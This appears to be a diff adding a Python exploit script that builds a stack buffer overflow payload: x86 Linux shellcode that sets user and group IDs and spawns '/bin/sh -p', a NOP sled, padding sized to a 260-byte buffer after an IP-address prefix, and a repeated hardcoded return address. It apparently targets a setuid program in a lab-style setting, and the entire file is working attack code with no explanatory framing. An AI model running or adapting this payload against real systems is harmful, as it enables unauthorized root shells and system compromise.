@@ -1,0 +1,35 @@
+import struct
+import sys
+
+# shellcode = ('\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'
+#              '\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0'
+#              '\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80'
+#              '\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68'
+#              '\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0'
+#              '\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90'
+#              '\x90\x90\x90\x90\x90\x90\x90\x90\x90')
+
+shellcode = ('\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'
+             '\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0'
+             '\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80'
+             '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62'
+             '\x69\x6e\x89\xe3\x50\x66\x68\x2d\x70\x89\xe6'
+             '\x50\x56\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
+             '\x31\xc0\x40\xcd\x80\x90\x90\x90\x90')
+
+left_space = 260 - len("127.0.0.1\t")
+safety_cushion = '\x90' * 50
+
+# 2. Subtract BOTH the shellcode and the cushion from the total padding
+nop_length = left_space - len(shellcode) - len(safety_cushion)
+nop_sled = '\x90' * nop_length
+
+# 3. Adjust the Target Address slightly lower so it hits the front NOP sled
+# Since we made the front sled 50 bytes shorter, we lower the address!
+target_address = 0xbffffa70
+ret_addr_packed = struct.pack("<I", target_address)
+
+# 4. Assemble the new structured payload
+payload = nop_sled + shellcode + safety_cushion + (ret_addr_packed * 15)
+
+sys.stdout.write(payload)
